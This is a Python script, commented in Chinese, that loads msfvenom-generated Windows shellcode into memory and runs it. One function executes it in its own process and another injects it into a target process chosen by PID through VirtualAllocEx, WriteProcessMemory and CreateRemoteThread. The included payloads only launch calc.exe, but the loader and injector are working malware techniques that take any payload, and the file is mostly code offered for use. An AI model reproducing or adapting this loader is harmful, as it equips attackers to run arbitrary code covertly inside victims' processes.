
from ctypes import *
from ctypes.wintypes import *
import sys


PAGE_EXECUTE_READWRITE = 0x00000040  # 区域可执行代码，可读可写
MEM_COMMIT = 0x3000  # 分配内存
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )  #给予进程所有权限

# windows api
VirtualAlloc = windll.kernel32.VirtualAlloc
RtlMoveMemory = windll.kernel32.RtlMoveMemory
CreateThread = windll.kernel32.CreateThread
WaitForSingleObject = windll.kernel32.WaitForSingleObject
OpenProcess = windll.kernel32.OpenProcess
VirtualAllocEx = windll.kernel32.VirtualAllocEx
WriteProcessMemory = windll.kernel32.WriteProcessMemory
CreateRemoteThread = windll.kernel32.CreateRemoteThread

# msfvenom -p windows/x64/exec CMD='calc.exe' -f py
shellcode = bytearray(
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    b"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    b"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    b"\x63\x2e\x65\x78\x65\x00"
)

# msfvenom -p windows/exec CMD='calc.exe' EXITFUNC=thread -f py
shellcode1 =  b""
shellcode1 += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
shellcode1 += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
shellcode1 += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
shellcode1 += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
shellcode1 += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
shellcode1 += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
shellcode1 += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
shellcode1 += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
shellcode1 += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
shellcode1 += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
shellcode1 += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
shellcode1 += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
shellcode1 += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
shellcode1 += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
shellcode1 += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
shellcode1 += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
shellcode1 += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
shellcode1 += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41"
shellcode1 += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
shellcode1 += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
shellcode1 += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
shellcode1 += b"\x78\x65\x00"


def run1():
    VirtualAlloc.restype = ctypes.c_void_p  # 重载函数返回类型为void
    p = VirtualAlloc(c_int(0), c_int(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)  # 申请内存
    buf = (c_char * len(shellcode)).from_buffer(shellcode)  # 将shellcode指向指针
    RtlMoveMemory(c_void_p(p), buf, c_int(len(shellcode)))  # 复制shellcode进申请的内存中
    h = CreateThread(c_int(0), c_int(0), c_void_p(p), c_int(0), c_int(0), pointer(c_int(0)))  # 执行创建线程
    WaitForSingleObject(c_int(h), c_int(-1))  # 检测线程创建事件


def run2(pid):
    h_process = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if h_process:
        p = VirtualAllocEx(h_process, c_int(0), c_int(len(shellcode1)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, c_size_t, POINTER(c_size_t)]
        WriteProcessMemory.restype = BOOL
        buf = create_string_buffer(shellcode1)
        WriteProcessMemory(h_process, p, shellcode1, sizeof(buf), byref(c_size_t(0)))
    else:
        print("无法打开进程pid: %s" % pid)
        sys.exit()

    CreateRemoteThread(h_process, None, c_int(0), p, None, 0, byref(c_ulong(0)))


if __name__ == "__main__":
    try:
        if sys.argv[1]:
            run2(int(sys.argv[1]))
        else:
            run1()
    except IndexError:
        run1()
